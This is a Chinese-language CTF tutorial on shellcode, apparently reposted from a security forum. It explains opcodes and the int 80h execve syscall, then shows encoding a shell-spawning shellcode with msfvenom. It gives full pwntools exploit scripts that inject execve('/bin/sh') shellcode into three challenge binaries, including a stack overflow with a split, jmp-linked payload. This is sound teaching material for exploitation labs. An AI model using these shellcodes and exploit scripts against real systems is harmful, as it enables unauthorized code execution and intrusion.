#
作者：[Tangerine@SAINTSEC](https://bbs.ichunqiu.com/thread-42285-1-1.html?from=beef)

# 0x00 shellcode的使用

在上一篇文章中我们学习了怎么使用栈溢出劫持程序的执行流程。为了减少难度，演示和作业题程序里都带有很明显的后门。然而在现实世界里并不是每个程序都有后门，即使是有，也没有那么好找。因此，我们就需要使用定制的shellcode来执行自己需要的操作。

首先我们把演示程序`~/Openctf
2016-tyro_shellcode1/tyro_shellcode1`复制到32位的docker环境中并开启调试器进行调试分析。需要注意的是，由于程序带了一个很简单的反调试，在调试过程中可能会弹出如下窗口：

![image.png](https://image.3001.net/images/20180703/15306016515476.png!small)  

此时点OK，在弹出的Exception handling窗口中选择No（discard）丢弃掉SIGALRM信号即可。

与上一篇教程不同的是，这次的程序并不存在栈溢出。从F5的结果上看程序使用read函数读取的输入甚至都不在栈上，而是在一片使用mmap分配出来的内存空间上。

![image.png](https://image.3001.net/images/20180703/15306016645542.png!small)通过调试，我们可以发现程序实际上是读取我们的输入，并且使用call指令执行我们的输入。也就是说我们的输入会被当成汇编代码被执行。  

![image.png](https://image.3001.net/images/20180703/15306016751031.png!small)![image.png](https://image.3001.net/images/20180703/153060168094.png!small)  

显然，我们这里随便输入的“12345678”有点问题，继续执行的话会出错。不过，当程序会把我们的输入当成指令执行，shellcode就有用武之地了。

首先我们需要去找一个shellcode，我们希望shellcode可以打开一个shell以便于远程控制只对我们暴露了一个10001端口的docker环境，而且shellcode的大小不能超过传递给read函数的参数，即0x20=32.我们通过著名的shell-storm.org的shellcode数据库`shell-storm.org/shellcode/找到了一段符合条件的shellcode`![image.png](https://image.3001.net/images/20180703/15306016922049.png!small)21个字节的执行sh的shellcode，点开一看里面还有代码和介绍。我们先不管这些介绍，把shellcode取出来![image.png](https://image.3001.net/images/20180703/15306017083344.png!small)使用pwntools库把shellcode作为输入传递给程序，尝试使用io.interactive()与程序进行交互，发现可以执行shell命令。![image.png](https://image.3001.net/images/20180703/15306017187203.png!small)

  
当然，shell-storm上还有可以执行其他功能如关机，进程炸弹，读取/etc/passwd等的shellcode，大家也可以试一下。总而言之，shellcode是一段可以执行特定功能的神秘代码。那么shellcode是怎么被编写出来，又是怎么执行指定操作的呢？我们继续来深挖下去。[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[链接文字](http://www.example.com)  

# 0x01 shellcode的原理

这次我们直接把断点下在`call eax`上，然后F7跟进

![030759ir9ybzss0a6k900v.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/030759ir9ybzss0a6k900v.png)可以看到我们的输入变成了如下汇编指令  

![030804zzmauocm2o8scjw8.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/030804zzmauocm2o8scjw8.png)

我们可以选择Options->General，把`Number of opcode bytes (non-graph)`的值调大  

![030813couy5dz566y16jdj.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/030813couy5dz566y16jdj.png)

会发现每条汇编指令都对应着长短不一的一串16进制数。  

![030829ssplpmvrspsbjxss.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/030829ssplpmvrspsbjxss.png)

对汇编有一定了解的读者应该知道，这些16进制数串叫做opcode。opcode是由最多6个域组成的，和汇编指令存在对应关系的机器码。或者说可以认为汇编指令是opcode的“别名”。易于人类阅读的汇编语言指令，如xor
ecx,
ecx等，实际上就是被汇编器根据opcode与汇编指令的替换规则替换成16进制数串，再与其他数据经过组合处理，最后变成01字符串被CPU识别并执行的。当然，IDA之类的反汇编器也是使用替换规则将16进制串处理成汇编代码的。所以我们可以直接构造合法的16进制串组成的opcode串，即shellcode，使系统得以识别并执行，完成我们想要的功能。关于opcode六个域的组成及其他深入知识此处不再赘述，感兴趣的读者可以在Intel官网获取开发者手册或其他地方查阅资料进行了解并尝试查表阅读机器码或者手写shellcode。  

# 0x03 系统调用

我们继续执行这段代码，可以发现EAX, EBX, ECX,
EDX四个寄存器被先后清零，EAX被赋值为0Xb，ECX入栈，`“/bin//sh”`字符串入栈，并将其首地址赋给了EBX，最后执行完int
80h，IDA弹出了一个warning窗口显示`got SIGTRAP signal`

![030852e5ytcx66yysj5mny.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/030852e5ytcx66yysj5mny.png)

点击OK，继续F8或者F9执行，选择Yes（pass to app）
.然后在python中执行io.interactive()进行手动交互，随便输入一个shell命令如ls，在IDA窗口中再次按F9，弹出另一个捕获信号的窗口![030859ibn5o017nczpppcb.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/030859ibn5o017nczpppcb.png)同样OK后继续执行，选择Yes（pass
to app），发现python窗口中的shell命令被成功执行。  
那么问题来了，我们这段shellcode里面并没有system这个函数，是谁实现了“system("/bin/sh")”的效果呢？事实上，通过刚刚的调试大家应该能猜到是陌生的int
80h指令。查阅intel开发者手册我们可以知道int指令的功能是调用系统中断，所以int
80h就是调用128号中断。在32位的linux系统中，该中断被用于呼叫系统调用程序system_call().我们知道，出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。但是我们显然可以通过调用read(),
write()之类的函数从键盘读取输入，把输出保存在硬盘里的文件中。那么read(),
write()之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？答案就在于int
80h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的 指令int 80h，就可以通知内核完成不同的功能。而read(),
write(),
system()之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。  
知道了int 80h的具体作用之后，我们接着去查表看一下如何使用`int
80h`实现`system("/bin/sh")`。通过`<http://syscalls.kernelgrok.com/>`，我们没找到system，但是找到了这个

![031053yz3rskz25v6iv44v.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031053yz3rskz25v6iv44v.png)对比我们使用的shellcode中的寄存器值，很容易发现shellcode中的`EAX
= 0Xb = 11，EBX = &(“/bin//sh”), ECX = EDX = 0`，即执行了`sys_execve("/bin//sh", 0,
0,
0)`，通过/bin/sh软链接打开一个shell.所以我们可以在没有system函数的情况下打开shell。需要注意的是，随着平台和架构的不同，呼叫系统调用的指令，调用号和传参方式也不尽相同，例如64位linux系统的汇编指令就是syscall，调用sys_execve需要将EAX设置为0x3B，放置参数的寄存器也和32位不同，具体可以参考`<http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64>`

# 0x04 shellcode的变形

在很多情况下，我们多试几个shellcode，总能找到符合能用的。但是在有些情况下，为了成功将shellcode写入被攻击的程序的内存空间中，我们需要对原有的shellcode进行修改变形以避免shellcode中混杂有\x00,
\x0A等特殊字符，或是绕过其他限制。有时候甚至需要自己写一段shellcode。我们通过两个例子分别学习一下如何使用工具和手工对shellcode进行变形。  
首先我们分析例子~/BSides San Francisco CTF
2017-b_64_b_tuff/b-64-b-tuff.从F5的结果上看，我们很容易知道这个程序会将我们的输入进行base64编码后作为汇编指令执行(注意存放base64编码后结果的字符串指针shellcode在return
0的前一行被类型强转为函数指针并调用)

![031112qttuxtj92gtoye5j.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031112qttuxtj92gtoye5j.png)

虽然程序直接给了我们执行任意代码的机会，但是base64编码的限制要求我们的输入必须只由0-9，a-z，A-Z，+，/这些字符组成，然而我们之前用来开shell的shellcode  
`"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"`显然含有大量的非base64编码字符，甚至包含了大量的不可见字符。因此，我们就需要对其进行编码。  
在不改变shellcode功能的情况下对其进行编码是一个繁杂的工作，因此我们首先考虑使用工具。事实上，pwntools库中自带了一个encode类用来对shellcode进行一些简单的编码，但是目前encode类的功能较弱，似乎无法避开太多字符，因此我们需要用到另一个工具msf[VENOM](http://www.ichunqiu.com/course/293?bbs)。由于kali中自带了metasploit，使用kali的读者可以直接使用。  
首先我们查看一下msfvenom的帮助选项

![031122qnnh9ldwbbtbb2bl.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031122qnnh9ldwbbtbb2bl.png)

显然，我们需要先执行`msfvenom -l encoders`挑选一个编码器

![031139fa5hzajil3hawzaf.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031139fa5hzajil3hawzaf.png)

图中的x86/alpha_mixed可以将shellcode编码成大小写混合的代码，符合我们的条件。所以我们配置命令参数如下：  
`python -c 'import sys;
sys.stdout.write("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'
| msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux
BufferRegister=EAX -o payload`  
我们需要自己输入shellcode，但msfvenom只能从stdin中读取，所以使用linux管道操作符“|”，把shellcode作为python程序的输出，从python的stdout传送到msfvenom的stdin。此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。最后，由于在b-64-b-tuff中是通过指令call
eax调用shellcode的

![031202rc23gcqgwp3wmqcf.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031202rc23gcqgwp3wmqcf.png)

所以配置`BufferRegister=EAX`。最后输出的payload内容为`PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA`  
编写脚本如下：  

    
    
    #!/usr/bin/python
    #coding:utf-8
    
    from pwn import *
    from base64 import *
    
    context.update(arch = 'i386', os = 'linux', timeout = 1)    
    
    io = remote('172.17.0.2', 10001)    
    
    shellcode = b64decode("PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA")
    print io.recv()
    io.send(shellcode)  
    print io.recv()     
    io.interactive()

成功获取shell

![031229gop4nznfkaqv5pph.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031229gop4nznfkaqv5pph.png)

工具虽然好用，但也不是万能的。有的时候我们可以成功写入shellcode，但是shellcode在执行前甚至执行时却会被破坏。当破坏难以避免时，我们就需要手工拆分shellcode，并且编写代码把两段分开的shellcode再“连”到一起。比如例子`~/CSAW
Quals CTF 2017-pilot/pilot`  
这个程序的逻辑同样很简单，程序的main函数中存在一个栈溢出。

![031254jrffx0oircx0p00h.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031254jrffx0oircx0p00h.png)

使用pwntools自带的检查脚本checksec检查程序，发现程序存在着RWX段（同linux的文件属性一样，对于分页管理的现代操作系统的内存页来说，每一页也同样具有可读(R)，可写(W)，可执行(X)三种属性。只有在某个内存页具有可读可执行属性时，上面的数据才能被当做汇编指令执行，否则将会出错）

![031303tze8e1e8vaaa1qav.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031303tze8e1e8vaaa1qav.png)

调试运行后发现这个RWX段其实就是栈，且程序还泄露出了buf所在的栈地址

![031310ysmekk5tdm55wdv0.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031310ysmekk5tdm55wdv0.png)

![031350cnjvw3uxs3nszeek.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031350cnjvw3uxs3nszeek.png)

所以我们的任务只剩下找到一段合适的shellcode，利用栈溢出劫持RIP到shellcode上执行。所以我们写了以下脚本  

    
    
    #!/usr/bin/python
    #coding:utf-8
    
    from pwn import *
    
    context.update(arch = 'amd64', os = 'linux', timeout = 1)   
    
    io = remote('172.17.0.3', 10001)    
    
    shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    #xor rdx, rdx
    #mov rbx, 0x68732f6e69622f2f
    #shr rbx, 0x8
    #push rbx
    #mov rdi, rsp
    #push rax
    #push rdi
    #mov rsi, rsp
    #mov al, 0x3b
    #syscall
    
    print io.recvuntil("Location:")                             #读取到"Location:"，紧接着就是泄露出来的栈地址
    shellcode_address_at_stack = int(io.recv()[0:14], 16)       #将泄露出来的栈地址从字符串转换成数字
    log.info("Leak stack address = %x", shellcode_address_at_stack)
    
    payload = ""                        
    payload += shellcode                                        #拼接shellcode
    payload += "\x90"*(0x28-len(shellcode))                 #任意字符填充到栈中保存的RIP处，此处选用了空指令NOP，即\x90作为填充字符
    payload += p64(shellcode_address_at_stack)                  #拼接shellcode所在的栈地址，劫持RIP到该地址以执行shellcode
    
    io.send(payload)
    io.interactive()

  
但是执行时却发现程序崩溃了。

![031404yy9kmivtkifbbjty.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031404yy9kmivtkifbbjty.png)很显然，我们的脚本出现了问题。我们直接把断点下载main函数的retn处，跟进到shellcode看看发生了什么

![031417t0lqbqqchqmcqzo8.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031417t0lqbqqchqmcqzo8.png)

![031425duxxq1u1l67ui6de.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031425duxxq1u1l67ui6de.png)

![031447b3rb3rm7bq6r9xcb.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031447b3rb3rm7bq6r9xcb.png)

![031502esdlftsmt1idt5qk.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031502esdlftsmt1idt5qk.png)

从这四张图和shellcode的内容我们可以看出，由于shellcode执行过程中的push，最后一部分会在执行完push
rdi之后被覆盖从而导致shellcode失效。因此我们要么得选一个更短的shellcode，要么就对其进行改造。鉴于shellcode不好找，我们还是选择改造。

首先我们会发现在shellcode执行过程中只有返回地址和上面的24个字节会被push进栈的寄存器值修改，而栈溢出最多可以向栈中写0x40=64个字节。结合对这个题目的分析可知在返回地址之后还有16个字节的空间可写。根据这四张图显示出来的结果，push
rdi执行后下一条指令就会被修改，因此我们可以考虑把shellcode在push rax和push rdi之间分拆成两段，此时push
rdi之后的shellcode片段为8个字节，小于16字节，可以容纳。

接下来我们需要考虑怎么把这两段代码连在一起执行。我们知道，可以打破汇编代码执行的连续性的指令就那么几种，call，ret和跳转。前两条指令都会影响到寄存器和栈的状态，因此我们只能选择使用跳转中的无条件跳转jmp.
我们可以去查阅前面提到过的Intel开发者手册或其他资料找到jmp对应的字节码，不过幸运的是这个程序中就带了一条。

![031518mwwbd098zawbo5bd.png](https://bbs.ichunqiu.com/data/attachment/album/201806/29/031518mwwbd098zawbo5bd.png)

从图中可以看出jmp short locret_400B34的字节码是EB
05。显然，jmp短跳转（事实上jmp的跳转有好几种）的字节码是EB。至于为什么距离是05而不是0x34-0x2D=0x07，是因为距离是从jmp的下一条指令开始计算的。因此，我们以此类推可得我们的两段shellcode之间跳转距离应为0x18，所以添加在第一段shellcode后面的字节为\xeb\x18，添加两个字节也刚好避免第一段shellcode的内容被rdi的值覆盖。所以正确的脚本如下：

    
    
    #!/usr/bin/python
    #coding:utf-8
    
    from pwn import *
    
    context.update(arch = 'amd64', os = 'linux', timeout = 1)   
    
    io = remote('172.17.0.3', 10001)    
    
    #shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    #原始的shellcode。由于shellcode位于栈上，运行到push rdi时栈顶正好到了\x89\xe6\xb0\x3b\x0f\x05处，rdi的值会覆盖掉这部分shellcode，从而导致执行失败，所以需要对其进行拆分
    #xor rdx, rdx
    #mov rbx, 0x68732f6e69622f2f
    #shr rbx, 0x8
    #push rbx
    #mov rdi, rsp
    #push rax
    #push rdi
    #mov rsi, rsp
    #mov al, 0x3b
    #syscall
    
    shellcode1 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50"
    #第一部分shellcode，长度较短，避免尾部被push rdi污染
    #xor rdx, rdx
    #mov rbx, 0x68732f6e69622f2f
    #shr rbx, 0x8
    #push rbx
    #mov rdi, rsp
    #push rax
    
    shellcode1 += "\xeb\x18"
    #使用一个跳转跳过被push rid污染的数据，接上第二部分shellcode继续执行
    #jmp short $+18h
    
    shellcode2 = "\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    #第二部分shellcode
    #push rdi
    #mov rsi, rsp
    #mov al, 0x3b
    #syscall
    
    print io.recvuntil("Location:")                             #读取到"Location:"，紧接着就是泄露出来的栈地址
    shellcode_address_at_stack = int(io.recv()[0:14], 16)       #将泄露出来的栈地址从字符串转换成数字
    log.info("Leak stack address = %x", shellcode_address_at_stack)
    
    payload = ""                        
    payload += shellcode1                                       #拼接第一段shellcode
    payload += "\x90"*(0x28-len(shellcode1))                    #任意字符填充到栈中保存的RIP处，此处选用了空指令NOP，即\x90作为填充字符
    payload += p64(shellcode_address_at_stack)                  #拼接shellcode所在的栈地址，劫持RIP到该地址以执行shellcode
    payload += shellcode2                                       #拼接第二段shellcode
    
    io.send(payload)
    io.interactive()

  

大家可以[阅读原文](https://bbs.ichunqiu.com/thread-42285-1-1.html?from=beef)下载课后例题和练习题哦~

